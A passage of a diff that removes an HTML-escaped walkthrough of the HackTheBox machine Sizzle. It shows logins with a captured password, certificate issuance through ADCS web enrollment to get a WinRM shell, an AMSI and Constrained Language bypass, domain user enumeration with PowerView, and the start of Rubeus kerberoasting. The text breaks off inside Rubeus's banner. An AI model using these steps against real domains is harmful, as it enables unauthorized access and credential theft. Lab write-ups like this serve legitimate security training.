-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can try to log in via WinRM:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; amanda &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Ashare1972
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-
-Error: Connection timeout or error occurred: WinRM::WinRMHTTPTransportError - Unable to parse authorization header. Headers: {&quot;Server&quot;=&amp;gt;&quot;Microsoft-HTTPAPI/2.0&quot;, &quot;Date&quot;=&amp;gt;&quot;Wed, 17 Jun 2026 14:00:25 GMT&quot;, &quot;Connection&quot;=&amp;gt;&quot;close&quot;, &quot;Content-Length&quot;=&amp;gt;&quot;0&quot;}
-Body:  (401).
-
-Warning: Cleaning up and exiting...
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;For some reason it won’t authenticate. Probably it requires a certificate. As we saw the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CertEntroll&lt;/code&gt; share before, probably ADCS over HTTP is enabled. Let’s try hit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://sizzle.htb/CERTSRV&lt;/code&gt; and log in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-2.png&quot; alt=&quot;sizzle-2.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Credentials worked. Let’s issue a certificate to use it for WinRM:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-3.png&quot; alt=&quot;sizzle-3.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In order to issue a certificate we need a certificate signing request (CSR). We can create one with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl genrsa &lt;span class=&quot;nt&quot;&gt;-des3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; amanda.key 2048 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  openssl req &lt;span class=&quot;nt&quot;&gt;-new&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; amanda.key &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; amanda.csr
-Enter PEM pass phrase:&amp;lt;Ashare1972&amp;gt;
-Verifying - Enter PEM pass phrase:&amp;lt;Ashare1972&amp;gt;
-Enter pass phrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;amanda.key:&amp;lt;Ashare1972&amp;gt;
-You are about to be asked to enter information that will be incorporated
-into your certificate request.
-What you are about to enter is what is called a Distinguished Name or a DN.
-There are quite a few fields but you can leave some blank
-For some fields there will be a default value,
-If you enter &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt;, the field will be left blank.
-&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
-Country Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 letter code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AU]:
-State or Province Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;full name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Some-State]:
-Locality Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, city&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Organization Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, company&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd]:
-Organizational Unit Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, section&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Common Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-Email Address &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-
-Please enter the following &lt;span class=&quot;s1&quot;&gt;&apos;extra&apos;&lt;/span&gt; attributes
-to be sent with your certificate request
-A challenge password &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-An optional company name &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;amanda.csr
-&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; CERTIFICATE REQUEST-----
-MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
-ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
-AQEBBQADggEPADCCAQoCggEBAOZA7grOvG6Q1XNDMMM6bm2j6wk1dua7xgcPhBKu
-37IwtS2AMpJymDOkIfdrjgIX4HdM4IDmOk45h1vhmn59fiTP4L/h3GhLdSXbFIEA
-d/A+Gx58m2uWbN5KjKooJCCA71tUMagk/xvRJJRUbI/x49xlJ7MN3hSm6alS1Im4
-3bRGfcG4EOfWuCoBcKLCbn8BxYM2o52MKaLxsaSjDkXtziVB7ksh0ICoC4byNpTm
-juLs/eC687DH0SNhHeS65eOZFHXkB5Qza1l151Lta/sMO4z8nh+CDoubM7lmQXsh
-SjvX7ZCk+KisULTn3LBKaZS7D0E/iS/XTJZSUfLlqFWHM8cCAwEAAaAAMA0GCSqG
-SIb3DQEBCwUAA4IBAQDPN4fkZXX2otC5aCtBJGI0VBwC0bxNTCRY1/qOfeWqUWR5
-eueoYxpebLOTJG+0UUFsl7yzVplRD5WH4bryOJ4yBay5/G+lMl40zpGpG1bPRGwp
-5IfgXzUR1kdqOGdW5f4S4i8Yin7aiopQZtnSkBYIg2CHd5ss2gpdeRW/u8pTaaL8
-dl+rPt3AOe8By/CAjv8ly9ZhvXzLm7J6kgKwN2P3OSHt2Z1HwAatFl3qkzzAMjeM
-LmQraN7L42LXXXE9DTYoNkD5VmgBFLIA2J3EDLsdQsaxDcNoSZRkaqGC75384VYS
-83qkQSrX7o3lU55aDhTfd524IIzKdSFX98CazQKa
-&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; CERTIFICATE REQUEST-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;That’s the CSR we need. Let’s upload it to the web service (and make sure Template &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User&lt;/code&gt; is selected):&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-4.png&quot; alt=&quot;sizzle-4.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64 Encoded&lt;/code&gt; and download certificate.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; amanda &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Ashare1972 &lt;span class=&quot;nt&quot;&gt;--priv-key&lt;/span&gt; ./amanda.key &lt;span class=&quot;nt&quot;&gt;--pub-key&lt;/span&gt; ./certnew.cer
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: Useless cert/s provided, SSL is not enabled
-
-Info: Establishing connection to remote endpoint
-
-
-Error: Connection timeout or error occurred: WinRM::WinRMHTTPTransportError - Unable to parse authorization header. Headers: {&quot;Server&quot;=&amp;gt;&quot;Microsoft-HTTPAPI/2.0&quot;, &quot;Date&quot;=&amp;gt;&quot;Wed, 17 Jun 2026 14:10:10 GMT&quot;, &quot;Connection&quot;=&amp;gt;&quot;close&quot;, &quot;Content-Length&quot;=&amp;gt;&quot;0&quot;}
-Body:  (401).
-
-Warning: Cleaning up and exiting...
-📦[tralsesec@kali Sizzle]$ evil-winrm -i $IP -u amanda -p Ashare1972 --priv-key ./amanda.key --pub-key ./certnew.cer --ssl
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: SSL enabled
-
-Info: Establishing connection to remote endpoint
-Enter PEM pass phrase:&amp;lt;Ashare1972&amp;gt;
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;manda&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;htb&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;manda
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here we go!&lt;/p&gt;
-
-&lt;p&gt;For convinience, run this to decrypt the private key to not use a password:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; amanda.key &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; amanda_decrypted.key
-Enter pass phrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;amanda.key:&amp;lt;Ashare1972&amp;gt;
-writing RSA key
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; amanda &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Ashare1972 &lt;span class=&quot;nt&quot;&gt;--priv-key&lt;/span&gt; ./amanda_decrypted.key &lt;span class=&quot;nt&quot;&gt;--pub-key&lt;/span&gt; ./certnew.cer &lt;span class=&quot;nt&quot;&gt;--ssl&lt;/span&gt;
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Warning: SSL enabled
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\amanda\Documents&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-3-lateral-movement-amanda---mrlky&quot;&gt;🤸 3. Lateral Movement (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;)&lt;/h2&gt;
-
-&lt;p&gt;In order to bypass AMSI and Contrained Language limitations, &lt;a href=&quot;https://github.com/tralsesec/PowerLess&quot;&gt;PowerLess&lt;/a&gt; can be used. Make sure to upload both PowerLess and PowerView.ps1 to the target machine to enumerate:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerLess.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Import-Module .\PowerView.ps1; Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof; Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname; Get-DomainUser -LDAPFilter \&quot;(userAccountControl:1.2.840.113556.1.4.803:=524288)\&quot; -Properties samaccountname,useraccountcontrol,memberof; Get-DomainUser -Properties samaccountname,description | Where-Object { $_.description -ne $null }&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serviceprincipalname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kadmin&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;changepw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memberof&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Denied&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RODC&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Replication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LOCAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;krbtgt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serviceprincipalname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sizzle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memberof&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DirectoryServices&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ResultPropertyValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mrlky&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Built&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;administering&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Guest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Built&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;guest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;access&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DefaultAccount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;by&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;samaccountname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;krbtgt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Distribution&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Center&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Account&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can see, the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; has an SPN (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http/sizzle&lt;/code&gt;), let’s kerberoast him. For that we need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\Temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Rubeus.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asktgt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/user:amanda&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/domain:htb.local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/password:Ashare1972&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/outfile:amanda.kirbi&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;______&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_____&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
